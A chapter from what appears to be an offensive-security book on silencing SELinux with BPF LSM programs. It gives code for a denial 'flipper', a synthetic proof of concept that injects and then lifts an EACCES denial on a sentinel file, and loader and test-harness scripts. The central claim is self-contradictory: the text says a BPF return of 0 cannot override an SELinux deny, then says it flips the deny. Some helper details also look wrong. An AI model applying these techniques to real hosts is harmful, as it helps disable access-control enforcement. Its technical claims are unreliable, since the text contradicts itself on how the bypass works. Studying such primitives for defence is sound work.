---
layout: book
title: "Chapter 6: Silencing SELinux"
date: 2025-02-06
---

Act I: Foundations of Breach

**Chapter 6: Silencing SELinux**

> **Note**: This primitive's natural hook did not fire on the test kernel. See [Chapter 21]({{ site.baseurl }}/book/act-3/chapter-21-the-autopsy-what-refused-to-die.html) for the skip reasoning. Three POC variants exist: `ch06-silence-selinux` (REAL observer, kprobes on AVC internals), `ch06-silence-selinux-lsm` (REAL mutation, non-sleepable `lsm/` fmod_ret on three hooks), and `ch06-silence-selinux-lsm-synthetic` (ANALOG, sleepable `lsm.s/file_open` that synthesizes both denial and flip). The synthetic variant is categorized as ANALOG because it manufactures the deny/flip cycle itself rather than flipping a natural SELinux denial.

The primitive this chapter documents is the use of a BPF LSM program to turn a policy denial into a policy allow. On a kernel with a policy-enforcing LSM active — SELinux on RHEL/Fedora/Amazon Linux 2023, SELinux-in-Android, or AppArmor on Ubuntu — the primitive is direct: the BPF LSM program attaches to the same hook the static LSM uses, and when the static LSM would have returned a negative errno, the BPF program returns `0`. The decision flip is the primitive.

On the test kernel used for this book (linuxkit 6.12 aarch64, which runs inside Docker Desktop on macOS and is the reference environment for the harness in `dBPF-pocs/`), the natural primitive could not be demonstrated end-to-end because no policy-enforcing LSM is active. `/sys/kernel/security/lsm` on the test kernel reports `capability,bpf`. There is no SELinux, no AppArmor, no Yama, no Tomoyo. The default capability LSM is the only static security module loaded, and the default capability LSM's `file_permission` and `inode_permission` hooks return `0` unconditionally. There is no denial to flip. A BPF LSM program attached to the hook observes checks that already allow; overriding the return value to `0` has no observable effect.

The synthetic variant — `dBPF-pocs/pocs/ch06-silence-selinux-lsm-synthetic/` — works around this by having the BPF LSM program synthesize its own denial and then, on a second stage, flip that denial to an allow. Both behaviors are demonstrated inside BPF on a kernel that has nothing to flip naturally. This chapter reads the synthetic POC line by line and explains how it models the real primitive, what the synthetic variant gives up relative to the real one, and what it costs to run the real variant on a SELinux-enforcing kernel.

## The honest state on the test kernel

The harness runs on linuxkit 6.12 aarch64. The LSM line is deterministic:

```
# cat /sys/kernel/security/lsm
capability,bpf
```

`capability` is the default capability LSM, which enforces `CAP_*` checks and nothing else. `bpf` is the BPF LSM subsystem, which is registered when `CONFIG_BPF_LSM=y` and the `lsm=` kernel command line includes `bpf`. The presence of `bpf` on this line is what allows BPF LSM programs to attach at all; without it, `bpf_prog_attach` with `BPF_LSM_MAC` fails with `-EINVAL` and the kernel logs "BPF LSM not enabled."

The test kernel has `bpf` but does not have `selinux`, `apparmor`, `tomoyo`, or `yama`. The consequences are concrete. A read of a regular file by an unprivileged user traverses `vfs_open` → `security_file_open` → the LSM chain, where the chain consists of `cap_file_open` (from the capability LSM, which returns `0` without work because the capability model does not gate file opens) and any BPF LSM programs attached to `file_open` (none, by default). The result is `0`, the file opens, and no denial occurs.

On a SELinux-enforcing kernel, the same path traverses `cap_file_open` → `selinux_file_open`, and `selinux_file_open` evaluates the AVC (Access Vector Cache). If the AVC does not have a cached decision, it consults the loaded policy; if the policy denies, `selinux_file_open` returns `-EACCES`. The LSM chain's all-must-grant combination rule propagates that `-EACCES` up to `vfs_open`, which fails the open syscall. This is the denial a real flipper would flip.

The test kernel has no equivalent path. `security_file_permission` returns `0`. `security_inode_permission` returns `0`. Every `open(2)` that passes the basic DAC checks succeeds. There is no natural denial for a BPF LSM fmod_ret-style flip to operate on. A BPF LSM program attached to `file_open` that returns `0` is a no-op because the chain was already going to return `0`.

This is not a failure of the BPF LSM subsystem; it is a consequence of the hardening posture of the minimal linuxkit kernel. The same BPF LSM program on a SELinux-enforcing Fedora kernel would work without modification. The synthetic variant exists so that the primitive is demonstrable on the harness kernel — not because the kernel has a flaw, but because the kernel does not have the layer the primitive operates against.

The loader's preflight check for BPF LSM availability is a three-line sanity read:

```c
static int check_bpf_lsm(void)
{
    FILE *f = fopen("/sys/kernel/security/lsm", "r");
    if (!f) { ... return 0; }
    char buf[512] = {0};
    if (!fgets(buf, sizeof(buf), f)) { fclose(f); return 0; }
    fclose(f);
    return strstr(buf, "bpf") != NULL;
}
```

If `bpf` is not in the LSM line, the loader emits a `CH06_SYNTH_SKIP` marker with the reason and exits with status 3. The harness treats status 3 as a skip rather than a failure, which is the correct semantic: the POC is unrunnable on this kernel, but its unrunnability is configuration rather than a bug. This is a recurring pattern for BPF primitives whose availability depends on kernel-build-time configuration; Chapter 1's `cap_capable` override has an analogous skip for `CONFIG_BPF_KPROBE_OVERRIDE=y`.

## Original ambition

The straightforward form of the primitive, which is what Chapter 6 would document on a SELinux-enforcing host, attaches a BPF LSM program to a specific SELinux hook and returns a permissive verdict for matched subjects. The two hooks of interest are `avc_has_perm` and `file_permission`.

`avc_has_perm` is the SELinux-internal function that evaluates a specific permission against the AVC. It is called by every SELinux LSM hook (`selinux_file_open`, `selinux_inode_permission`, `selinux_capable`, etc.) to consult the cached decisions. On a policy-enforcing kernel `avc_has_perm` returns `0` when the policy allows and a negative errno when it denies. A BPF program attached via `SEC("lsm/avc_has_perm")` cannot attach directly in stock BPF LSM because `avc_has_perm` is not one of the registered LSM hooks — it is an internal helper. An alternative is a kprobe on `avc_has_perm`, but a kprobe cannot modify the return value unless `CONFIG_BPF_KPROBE_OVERRIDE=y` and the function is in `ALLOW_ERROR_INJECTION`. `avc_has_perm` is not annotated, so the kprobe path is observation-only (the same pattern Chapter 1 documents for `cap_capable`).

The LSM-native way to do this on a SELinux-enforcing kernel is to attach at `file_permission` or `inode_permission`:

```c
SEC("lsm/file_permission")
int BPF_PROG(flipper, struct file *file, int mask)
{
    struct task_struct *task = bpf_get_current_task_btf();
    unsigned int tgid = BPF_CORE_READ(task, tgid);
    if (is_target_tgid(tgid))
        return 0;  // Allow, regardless of what the static LSM decided.
    return 0;  // Also allow for non-targets; we are not adding new policy.
}
```

The LSM chain's combination rule is all-must-grant. A BPF LSM program returning `0` allows the check from the BPF LSM's perspective, but the static LSM's decision is also combined in. If SELinux returned `-EACCES`, the final chain result is `-EACCES` — the BPF `0` does not override the SELinux deny. This is the standard LSM combination and it is what prevents BPF from being a general override mechanism.

The flip, in this form, is not actually a flip. It is a second policy layer that also grants. To actually override a static LSM deny, a different mechanism is needed, and the mechanism is `fmod_ret`. BPF LSM `fmod_ret` programs run after the static LSMs and can set the LSM hook's final return value directly. Not every LSM hook supports BPF attachment; the set of supported hooks is defined in `kernel/bpf/bpf_lsm.c` where `BTF_SET_START(bpf_lsm_hooks)` includes all hooks from `lsm_hook_defs.h`, and a separate `BTF_SET_START(bpf_lsm_disabled_hooks)` blacklists specific hooks that are incompatible (e.g., `vm_enough_memory`, `inode_need_killpriv`, `inode_getsecurity`). On 6.12 the effective set is nearly all LSM hooks minus a small disabled list. `file_open`, `file_permission`, `inode_permission`, and most other hooks are included.

A real flipper on a SELinux-enforcing kernel uses non-sleepable LSM hooks — `SEC("lsm/file_permission")`, `SEC("lsm/inode_permission")`, `SEC("lsm/bprm_check_security")` — with the understanding that fmod_ret semantics apply. Non-sleepable (`lsm/` not `lsm.s/`) because the programs use no sleepable helpers (`bpf_d_path`, `bpf_copy_from_user`, etc.); they only inspect pointer arguments and the trailing return value. The program runs after the static LSMs and the final return value is the BPF program's return. When the static LSM returned `-EACCES` and the BPF program returns `0`, the chain result is `0` and the denial is flipped. This is the primitive the chapter documents.

On the test kernel this primitive is silent. The static LSM chain never returns `-EACCES` for file opens (because the only static LSM is capability, which does not gate file opens), so the BPF program always sees a chain that already allows. Returning `0` from the BPF program changes nothing. Returning `-EACCES` from the BPF program would introduce a denial where none existed, which is the inverse of the primitive. The natural environment for the flip is missing.

It is worth pausing on the terminology here because the language "fmod_ret" is used loosely in BPF documentation. Strictly, `fmod_ret` is a program attach type declared with `SEC("fmod_ret/<symbol>")`, which targets functions listed in `BTF_SET_START(bpf_modify_return_targets)` in `kernel/trace/bpf_trace.c`. BPF LSM programs declared with `SEC("lsm/<hook>")` or `SEC("lsm.s/<hook>")` are a different attach type (`BPF_PROG_TYPE_LSM`, attach type `BPF_LSM_MAC`) but share the "can modify the return value" capability when attached to LSM hooks registered in `kernel/bpf/bpf_lsm.c` via the `BTF_SET_START(bpf_lsm_hooks)` allowlist. Calling these "fmod_ret-style" is accurate in semantics (they can override the return value) but imprecise in attach type. The BPF LSM attach is a purpose-built mechanism for LSM hooks; the general `fmod_ret` mechanism is for non-LSM functions that opt into BPF return-value modification. For this chapter, the relevant allowlist is `bpf_lsm_hooks`, and `file_open` is in it.

The program load and attach sequence for a BPF LSM program is also worth spelling out because it differs from kprobe attachment. The loader's skeleton-generated code invokes `ch06_silence_selinux_lsm_synthetic_bpf__open_and_load`, which calls `bpf(BPF_PROG_LOAD, ...)` with `prog_type = BPF_PROG_TYPE_LSM` and `expected_attach_type = BPF_LSM_MAC`. The kernel's verifier runs the BPF LSM-specific acceptance checks: the program must return an integer compatible with the hook's return type, it must not have side effects that persist beyond the hook (it can update maps, but it cannot, for example, call `bpf_send_signal` from a non-sleepable context), and it must respect the hook's sleepability. After load, the loader calls `bpf(BPF_RAW_TRACEPOINT_OPEN, ...)` (which internally handles the LSM attach), passing the `btf_id` of the target hook. The kernel looks up the hook in the `bpf_lsm_hooks` allowlist and links the program into the hook's dispatch chain. From that point, every invocation of the hook runs the BPF program as part of the chain.

## The synthetic three-stage design

The synthetic variant solves this by making one BPF program produce both sides of the flip — first synthesize the denial, then flip it — under control of a user-space toggle. The program is one `SEC("lsm.s/file_open")` program with a three-state control map.

The full program in `ch06-silence-selinux-lsm-synthetic.bpf.c` is 165 lines. The control map is declared at line 52:

```c
#define STAGE_OFF  0
#define STAGE_DENY 1
#define STAGE_FLIP 2

#define SENTINEL_MAX 128

struct ctrl {
    unsigned int stage;
    unsigned int target_uid;
    unsigned int sentinel_len;
    char sentinel[SENTINEL_MAX];
};

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __type(key, unsigned int);
    __type(value, struct ctrl);
    __uint(max_entries, 1);
} ctrl_map SEC(".maps");
```

A single-entry array map holding a `struct ctrl` with four fields: the stage (one of `STAGE_OFF`, `STAGE_DENY`, `STAGE_FLIP`), the target UID (the only UID the program acts on), the sentinel path length, and the sentinel path itself. The 128-byte sentinel buffer is generous enough for `/tmp/ch06-synth-stage.XXXXXX/sentinel.txt`-style paths; longer sentinels would require increasing `SENTINEL_MAX` and rebuilding.

The `SEC("lsm.s/file_open")` attachment point is chosen for specific reasons. `file_open` is called exactly once per `open(2)` syscall that reaches past the path-resolution stage. Its argument is `struct file *`, which exposes `f_path` (the `struct path` that `bpf_d_path` consumes) and a number of other fields useful for subject matching. The sleepable variant `lsm.s/` is needed because `bpf_d_path` is a sleepable helper.

The program body starts at line 98:

```c
SEC("lsm.s/file_open")
int BPF_PROG(ch06_synth_file_open, struct file *file)
{
    unsigned int k = 0;
    struct ctrl *c = bpf_map_lookup_elem(&ctrl_map, &k);
    if (!c)
        return 0;
    if (c->stage == STAGE_OFF)
        return 0;
```

The first three lines handle the degenerate case. If the control map lookup fails (which should not happen but the verifier requires the check), the program returns `0` and allows the open. If the stage is `STAGE_OFF`, the program returns `0`; this is the steady-state no-op mode that the loader starts in.

The UID filter is the next gate:

```c
unsigned long long ut = bpf_get_current_uid_gid();
unsigned int uid = (unsigned int)(ut & 0xffffffff);

// Fast reject: wrong uid → don't bother resolving the path.
if (uid != c->target_uid)
    return 0;
```

`bpf_get_current_uid_gid` returns a 64-bit value with the UID in the low 32 bits and the GID in the high 32 bits. The program masks off the UID and compares it to the target UID from the control map. A non-matching UID returns `0` immediately, avoiding the expensive path resolution. This is the subject filter: the primitive only affects opens by the targeted UID. Opens by root, opens by other unprivileged users, opens by system daemons — all pass through unchanged.

The path resolution is the expensive step:

```c
struct path_scratch *ps = bpf_map_lookup_elem(&scratch, &k);
if (!ps)
    return 0;

long n = bpf_d_path(&file->f_path, ps->buf, sizeof(ps->buf));
if (n <= 0)
    return 0;
```

`bpf_d_path` takes a `struct path *` and writes the full path to a caller-provided buffer. The buffer cannot live on the BPF stack because the stack is limited to 512 bytes, and the 128-byte scratch buffer plus the rest of the program's locals would push against that limit. The `scratch` map is a per-CPU array with a single entry holding a `struct path_scratch { char buf[SENTINEL_MAX]; }`. Using a per-CPU map avoids cross-CPU contention and gives each CPU its own scratch without locking.

`bpf_d_path` returns the number of bytes written including the trailing NUL. A zero or negative return indicates failure (the path could not be resolved, typically because the file is in an unlinked state or the dentry has been freed); the program returns `0` in that case, declining to act on opens whose path cannot be determined.

The sentinel match is the object filter:

```c
unsigned int slen = c->sentinel_len;
if (slen == 0 || slen > SENTINEL_MAX)
    return 0;

int matched = str_eq_n(ps->buf, c->sentinel, slen);
if (!matched)
    return 0;
```

The `str_eq_n` helper (defined at line 84) walks both buffers byte by byte up to `slen` characters, treating a NUL byte or a position past `slen` as a match-terminating success. The sentinel match requires the path to match exactly. A different file, even in the same directory, does not match. A symlink that resolves to the sentinel does match, because `bpf_d_path` gives the resolved path. A bind-mount to the sentinel does match, because `bpf_d_path` gives the path in the current mount namespace.

The event emission and stage-conditional verdict live in the final block:

```c
struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
int verdict = 0;
if (e) {
    unsigned long long id = bpf_get_current_pid_tgid();
    e->pid = (unsigned int)(id & 0xffffffff);
    e->tgid = (unsigned int)(id >> 32);
    e->uid = uid;
    bpf_get_current_comm(&e->comm, sizeof(e->comm));
    e->stage = c->stage;
    e->matched = 1;
    #pragma unroll
    for (int i = 0; i < SENTINEL_MAX; i++)
        e->path[i] = ps->buf[i];
}

if (c->stage == STAGE_DENY) {
    verdict = -EACCES;
} else if (c->stage == STAGE_FLIP) {
    verdict = 0;
}

if (e) {
    e->verdict = verdict;
    bpf_ringbuf_submit(e, 0);
}
return verdict;
```

The event struct captures the full decision: which process called `open`, under which UID, which command, which stage was active, what the verdict was, and what the path was. The event is submitted to the ringbuf regardless of verdict, so a userspace consumer sees every matched decision.

The stage-conditional branch is the primitive. `STAGE_DENY` returns `-EACCES`, which is the errno for "permission denied." The LSM chain's combination rule takes the BPF program's `-EACCES` and propagates it up. The `open(2)` syscall returns `-1` and the caller sees `errno == EACCES`. A sentinel file open that would have succeeded (because no other LSM denies it) now fails because the BPF program has introduced a denial.

`STAGE_FLIP` returns `0`, which is "allow." This is the primitive's flip side: a BPF program that had been returning `-EACCES` now returns `0` for the same subject and object. On a kernel where the static LSM chain was denying, this `0` would be the flip — turning the static LSM's `-EACCES` into an allow. On the synthetic kernel, there is no static LSM denial to flip, but the synthetic denier in stage 1 established what such a denial would look like, and stage 2 demonstrates the mechanism that would flip it.

The critical claim of the synthetic variant is that the stage-1 denier and the stage-2 flipper are the same program running at the same attach point, differing only in the control map's `stage` field. This demonstrates the fmod_ret mechanism without needing a natural denial to operate on. A real-world attacker using the same fmod_ret mechanism against a SELinux-enforcing kernel would not need the denier stage; the static LSM provides the denial, and the flipper stage alone is the primitive.

The `str_eq_n` helper in the BPF program is a straightforward unrolled memcmp:

```c
static __always_inline int str_eq_n(const char *a, const char *b, int n)
{
    #pragma unroll
    for (int i = 0; i < SENTINEL_MAX; i++) {
        if (i >= n)
            return 1;
        if (a[i] != b[i])
            return 0;
        if (a[i] == 0)
            return 1;
    }
    return 1;
}
```

Three exit conditions: exceeded the requested length (match), bytes differ at position `i` (no match), or both bytes are NUL (match). The outer loop bound is `SENTINEL_MAX` (128) so the verifier sees a compile-time-bounded loop. The `#pragma unroll` directive produces 128 copies of the loop body in the compiled BPF bytecode, which is acceptable because each iteration has only a few instructions. The total program size after unrolling is around 1.5 KB of BPF bytecode, well under the 1-million-instruction limit.

The reason the helper walks up to `SENTINEL_MAX` rather than stopping at `n` is a verifier subtlety: a loop whose upper bound is a map-provided value (as `n` is, via `c->sentinel_len`) is harder for the verifier to prove bounded than a loop whose upper bound is a compile-time constant. The program short-circuits at `i >= n`, which gives early-return behavior equivalent to a length-limited loop, while keeping the bytecode-visible bound at the fixed `SENTINEL_MAX`. This is a common BPF idiom: use compile-time bounds for verifier happiness, use early-returns for actual behavior. The resulting code is slightly larger than a minimally-bounded version would be, but the program loads cleanly on every verifier version.

The event struct layout is a secondary but load-bearing detail:

```c
struct evt {
    unsigned int pid, tgid, uid;
    char comm[16];
    int stage;
    int verdict;       // 0 = allow, -EACCES = deny
    int matched;       // 1 if sentinel/uid matched
    char path[SENTINEL_MAX];
};
```

Three identifier fields (pid, tgid, uid) give the loader a full subject identity. `comm[16]` is the kernel's `task_struct->comm` field, which is a truncated executable name bounded to 15 characters plus a NUL. `stage`, `verdict`, and `matched` are the decision metadata. `path[SENTINEL_MAX]` is the resolved file path.

The total struct size is 12 + 16 + 12 + 128 = 168 bytes. After ringbuf's 8-byte alignment, each event reserves 168 bytes (already aligned). The ringbuf's 256-KB capacity (`1 << 18` bytes = 256 KB; the declared `max_entries` for ringbuf is interpreted as the ringbuf's byte capacity, so 256 KB gives room for roughly 1500 events before backpressure). This is ample headroom for the test workload, which produces one event per matched open.

## Why sleepable LSM (lsm.s)

The `SEC("lsm.s/file_open")` annotation declares the program as a sleepable LSM program, using the `.s` suffix on the section name. The choice between sleepable and non-sleepable LSM programs is not a style preference; it is dictated by the helpers the program needs.

`bpf_d_path` is a sleepable helper. Its implementation in `kernel/trace/bpf_trace.c` calls `d_path`, the kernel's standard path-reconstruction function, which walks the dentry tree and can sleep under memory pressure (it may need to allocate, may need to take locks that sleep). A non-sleepable BPF program cannot call `bpf_d_path`. The verifier rejects the program at load time with a "helper not allowed in this context" error.

The LSM hook must also be sleepable for a `.s` program to attach. The kernel declares which LSM hooks are sleepable in `kernel/bpf/bpf_lsm.c` via the `BTF_SET_START(sleepable_lsm_hooks)` set, which is checked by `bpf_lsm_is_sleepable_hook()`. On 6.12, `file_open` is in the sleepable set. `inode_permission` is not. `file_permission` is not.

The practical consequence is a decision tree for LSM programs:

- **Need a resolved path** → use `lsm.s/<sleepable hook>`, call `bpf_d_path`. `file_open`, `bprm_check_security`, `inode_getattr`, and a handful of others are sleepable.
- **Only need pointer arguments (file, inode, cred, etc.)** → use `lsm/<any hook>`, avoid `bpf_d_path`. The inode path is not directly available; the program can only compare inode numbers, superblock pointers, or similar structural identifiers.

The synthetic POC needed a path match (because the sentinel is specified as a filesystem path in the loader's CLI), so the sleepable variant was required. An alternative design could have used `inode_permission` (non-sleepable) with the sentinel specified as an inode number + superblock pointer; the user ergonomics would be worse (specifying "the inode 12345 on the device 8:1" instead of "/tmp/sentinel.txt") but the verifier constraints would be relaxed.

The tradeoff between sleepable and non-sleepable has a second dimension. Sleepable BPF programs run in a context where the kernel has just acquired a reference to the object under consideration and is about to perform a long-running operation. Non-sleepable programs run in a tighter context and cannot block. For `file_open`, which is called in the context of the `open(2)` syscall, the sleepable context is always available. For `inode_permission`, which is called deep in the VFS path-walk, the context is not always sleepable — some call sites hold the dentry lock or are in RCU-protected paths — so the hook is declared non-sleepable for the most restrictive caller.

The kernel's BTF information for LSM hooks is the source of truth about which hooks are sleepable. On a running kernel:

```
# bpftool btf dump file /sys/kernel/btf/vmlinux | grep -E "file_open|file_permission|inode_permission" | head
```

produces the function signatures for each hook. The sleepable flag is encoded in the kernel-internal `sleepable_lsm_hooks` BTF set in `kernel/bpf/bpf_lsm.c`, not in the generic `LSM_HOOK` definitions in `include/linux/lsm_hook_defs.h`, so the hook definition file alone does not tell you which hooks are sleepable. The authoritative source is the `BTF_SET_START(sleepable_lsm_hooks)` block in `kernel/bpf/bpf_lsm.c`. The practical way to determine sleepability at runtime is to attempt the attach with `.s` and observe the error, or to consult the kernel source for the target version.

A related consideration is that `bpf_d_path` has its own security considerations. The helper's security hook (`bpf_d_path`'s KF_ACQUIRE attribute) requires that the caller have a reference on the `path` being resolved. In the `file_open` context, the `struct file *` argument holds such a reference via the file's `f_path` member. Other LSM hooks that hand the program a raw `struct path *` without a guaranteed reference cannot safely call `bpf_d_path`. This is why the POC specifically takes `struct file *` from the hook and dereferences `file->f_path` rather than taking a `struct path *` directly; the reference is guaranteed by the `file` argument. An incorrectly-written LSM program that tries to call `bpf_d_path` on an unreferenced `path` will produce verifier errors or, worse, runtime instability.

The helper signature is:

```c
long bpf_d_path(struct path *path, char *buf, u32 sz);
```

The return convention is the number of bytes written, including the NUL terminator. A negative return is an error (typically `-EINVAL` if the path cannot be reconstructed, or `-ENAMETOOLONG` if the path exceeds the buffer). The POC's check `if (n <= 0) return 0;` handles both the negative-error and zero-return cases uniformly.

## Stage control via signals

The loader `ch06-silence-selinux-lsm-synthetic.c` uses POSIX signals to drive the stage transitions. The signal handler at line 56 captures the five signals the loader responds to — three stage-transition signals (`SIGUSR1`, `SIGUSR2`, `SIGHUP`) plus `SIGINT` and `SIGTERM` for clean shutdown:

```c
static void on_sig(int s)
{
    switch (s) {
    case SIGINT:
    case SIGTERM:
        stop = 1;
        break;
    case SIGUSR1:
        want_stage = STAGE_DENY;
        break;
    case SIGUSR2:
        want_stage = STAGE_FLIP;
        break;
    case SIGHUP:
        want_stage = STAGE_OFF;
        break;
    default:
        break;
    }
}
```

The handler does not touch the control map directly because `bpf_map__update_elem` is not async-signal-safe. Instead, the handler sets a `volatile sig_atomic_t` flag `want_stage` with the desired stage. The main loop polls this flag on each ring-buffer poll cycle and pushes the stage into the control map when it differs from the current value:

```c
while (!stop) {
    int n = ring_buffer__poll(rb, 200);
    if (n < 0 && n != -EINTR)
        break;
    if (want_stage != -1) {
        c.stage = (unsigned int)want_stage;
        want_stage = -1;
        if (push_ctrl(s, &c) == 0) {
            fprintf(stderr, "[ch06-synth] stage -> %s\n",
                    stage_name((int)c.stage));
        }
    }
}
```

The 200ms poll timeout caps the worst-case stage-change latency at 200ms, which is fast enough for interactive testing. The trigger script sends a signal and then sleeps 300ms before issuing the test open, which is slightly longer than the worst-case to avoid flakiness.

The stage push uses `bpf_map__update_elem` with `BPF_ANY`:

```c
static int push_ctrl(struct ch06_silence_selinux_lsm_synthetic_bpf *s,
                     struct ctrl *c)
{
    unsigned int k = 0;
    int err = bpf_map__update_elem(s->maps.ctrl_map,
                                   &k, sizeof(k),
                                   c, sizeof(*c),
                                   BPF_ANY);
    ...
}
```

For a single-entry array map, `BPF_ANY` is a straight overwrite. The map is implemented as a flat memory region, and the update is a memcpy under a spinlock. The BPF program reading the map sees either the old value or the new value — never a torn read — because the array map's update path uses the appropriate memory ordering.

The trigger script exercises the full cycle:

```bash
# --- BEFORE: denier only (stage=DENY) ---------------------------------
echo "=== BEFORE: stage=DENY — expect EACCES ==="
kill -USR1 "$LPID"
sleep 0.3
BEFORE_RC=$(read_as_dut)
echo "before_rc=$BEFORE_RC (expected=1, EACCES)"

# --- AFTER: flipper on (stage=FLIP) -----------------------------------
echo "=== AFTER: stage=FLIP — expect success ==="
kill -USR2 "$LPID"
sleep 0.3
AFTER_RC=$(read_as_dut)
echo "after_rc=$AFTER_RC (expected=0, success)"
```

`read_as_dut` is a helper that uses `su` (or `runuser`) to run `cat "$SENTINEL" >/dev/null` as the target user and captures the exit code. Under `STAGE_DENY`, the cat fails with EACCES and the wrapper reports `1`. Under `STAGE_FLIP`, the cat succeeds and the wrapper reports `0`. The before/after comparison is the proof that the primitive works — the same user, the same file, on the same kernel, with only the stage changing between runs, produces opposite outcomes.

## Why stacked programs cannot chain

The synthetic variant uses one program with a map toggle rather than two programs (one denier, one flipper) attached to the same hook. This is not a stylistic choice; it is required by the LSM chain's short-circuiting behavior.

The LSM chain for a given hook is walked by `call_int_hook`, a macro defined in `security/security.c`. The macro expands to a loop over the registered handlers for the hook, stopping at the first handler that returns a value different from the hook's default return (`LSM_RET_DEFAULT`). For security hooks like `file_permission` and `file_open`, the default is `0` (allow), so any non-zero return short-circuits. For a hook with handlers A, B, C, the effective logic is:

```c
int rc = LSM_RET_DEFAULT(hook);  // 0 for most security hooks
for (handler in [A, B, C]) {
    rc = handler(args);
    if (rc != LSM_RET_DEFAULT(hook))
        break;  // Short-circuit on first non-default return.
}
return rc;
```

This is the "first deny wins" semantic of the LSM chain for hooks whose default is `0`. A handler that returns `-EACCES` prevents later handlers from running. A handler that returns `0` allows the loop to continue to the next handler.

The consequence for a denier+flipper pair is severe. If program A (the denier) is registered before program B (the flipper) on the same LSM hook, and program A returns `-EACCES`, program B never runs. The flip cannot happen because the flipper never executes. If the order is reversed — flipper first, denier second — the flipper returns `0`, the denier then returns `-EACCES`, and the final result is `-EACCES`. The flipper's `0` does not override the denier's `-EACCES`, because the final result is determined by the first non-zero return (or by the combination rule described above, which is equivalent for the fmod_ret case).

No ordering of a separate denier program and a separate flipper program on the same hook produces the "denial synthesized then flipped" behavior. The semantic the synthetic variant needs — the same hook returning `-EACCES` in one execution and `0` in the next — cannot be expressed as a static chain of two programs. It requires one program whose verdict is externally controlled.

`bpf_override_return` is the helper that would, in principle, let one program override another's return value. It is restricted to kprobe contexts and is not available from LSM program contexts. Calling `bpf_override_return` from an `lsm/` or `lsm.s/` program fails verification with "helper not allowed." The restriction is deliberate: LSM verdict overrides are what fmod_ret is for, and fmod_ret has its own allowlist (`bpf_lsm_hooks` in `kernel/bpf/bpf_lsm.c`), whereas `bpf_override_return` was designed for error-injection testing on functions annotated with `ALLOW_ERROR_INJECTION`. Mixing the two would let BPF LSM programs override each other, which is an unsupported semantic.

The single-program-two-stage design is the honest way to demonstrate both halves of the flip mechanism on the synthetic kernel. A reader who wants to see the flip as two separate programs can point at a real SELinux-enforcing kernel, load only a flipper program (no denier — SELinux provides the denials), and observe the same flip. The synthetic kernel requires one program because it has to manufacture the denial itself.

There is a deeper kernel-architecture observation in this constraint. The LSM chain's first-deny-wins semantic is a deliberate design choice that prevents policy composition bugs: if two LSMs disagree, the safer (more restrictive) decision wins. This is the right default for a security subsystem. A mechanism that allowed a later LSM to override an earlier LSM's denial would let any installed LSM trivially disable policy enforcement by other LSMs, which is the opposite of what a security subsystem should allow. The synthetic variant's inability to express "denier then flipper" as two programs is not a bug; it is evidence that the LSM chain is working as designed.

The fmod_ret mechanism sidesteps this design by letting BPF programs run at a specific position in the chain (after the static LSMs, with combination semantics that let the BPF program set the final return value), but only for hooks the BPF LSM maintainers have decided can safely accept the mechanism. The `bpf_lsm_hooks` set includes nearly all LSM hooks from `lsm_hook_defs.h`, with a small `bpf_lsm_disabled_hooks` blacklist for hooks whose return types or semantics are incompatible (e.g., `vm_enough_memory`, `inode_need_killpriv`, `inode_getsecurity`). `file_open` is in the enabled set; hooks on the disabled list are rejected at attach time. The maintainers review additions to the disabled list on a case-by-case basis.

On the BPF LSM design, the canonical reference is KP Singh's 2020 patch series (lore.kernel.org/bpf/20200220175250.10795-1-kpsingh@chromium.org). The cover letter explains the design goals: allow BPF programs to attach as LSMs, run after the static LSMs, participate in the chain's decision, with fmod_ret semantics for hooks where it is safe. The review discussion on that series is the primary source for understanding why the allowlist is structured the way it is. Readers interested in adding new hooks to the allowlist should read the original thread; it sets the precedent for what the maintainers ask for before they accept a hook addition.

## Harness behavior

The harness entry for the synthetic variant lives in `dBPF-pocs/harness/proof.py` at line 140:

```python
Poc("ch06s", "Silence SELinux — synthetic LSM (analog)",
    "ch06-silence-selinux-lsm-synthetic",
    hooks=["bpf-lsm"], prefix="[ch06-synth]", needs_bpf_lsm=True,
    mode="trigger-runs-loader", timeout=25,
    proof_marker=r"CH06_CONCEPT_PROVEN|CH06_SYNTH_PROVEN|_PROVEN"),
```

The `ch06s` POC ID distinguishes the synthetic variant from the natural `ch06` POC, which targets SELinux directly. The `needs_bpf_lsm=True` flag causes the harness to skip the POC on kernels where `/sys/kernel/security/lsm` does not contain `bpf`. The `mode="trigger-runs-loader"` mode passes control to the trigger script, which handles the user creation and the signal-driven stage transitions.

The kprobe observer variant is registered as `ch06o` with `pocdir="ch06-silence-selinux"`, hooks `["avc_has_perm", "avc_has_perm_noaudit", "selinux_file_permission"]`, prefix `[ch06]`, and proof marker `r"CH06_PROVEN\s+hook=|CH06_SKIP\s+reason="`. The skip branch of the regex is deliberate: on kernels without SELinux compiled in (the linuxkit harness host) the loader emits `CH06_SKIP reason="SELinux not loaded"` and the harness recognizes that as an honest skip via the `skip_re` pass in `run_poc`; on an SELinux-enforcing kernel the loader emits `CH06_PROVEN hook=<name> events=<n>` on the first captured AVC decision per hook. All three ch06 variants — observer (`ch06o`), LSM mutation (`ch06`), and synthetic (`ch06s`) — are now registered adjacent to each other in `POCS`.

The proof marker is `CH06_CONCEPT_PROVEN`, emitted by the trigger with two fields:

```bash
echo "=== CH06_CONCEPT_PROVEN denial_injected=yes flip_applied=yes ==="
```

The two fields are independent. `denial_injected=yes` means the stage-1 test produced a `cat` failure with EACCES and the loader's ringbuf logged at least one `stage=deny` event with `verdict=-13`. `flip_applied=yes` means the stage-2 test produced a `cat` success and the loader's ringbuf logged at least one `stage=flip` event with `verdict=0`. Both fields must be `yes` for the overall POC to pass.

The sentinel file setup is conservative:

```bash
STAGE="$(mktemp -d /tmp/ch06-synth-stage.XXXXXX)"
SENTINEL="$STAGE/sentinel.txt"
echo "ch06-synth-secret" > "$SENTINEL"
chmod 644 "$SENTINEL"
chmod 755 "$STAGE"
```

A world-readable file in a world-traversable directory. An unprivileged user can read the file via the DAC check without needing any LSM intervention. This is the "would succeed by default" baseline; the BPF program's stage-1 denial is the introduction of a new denial on top of this allow baseline, and the stage-2 flip is the removal of that injected denial.

The unprivileged user is created fresh for each run:

```bash
DUT=dut06synth
id "$DUT" >/dev/null 2>&1 || useradd -M "$DUT" 2>/dev/null || adduser -D "$DUT" 2>/dev/null
DUT_UID="$(id -u "$DUT" 2>/dev/null)"
```

`useradd -M` creates a user without a home directory; the `adduser -D` fallback handles distros (Alpine, BusyBox) where `useradd` is not available. The user is deleted in the cleanup trap:

```bash
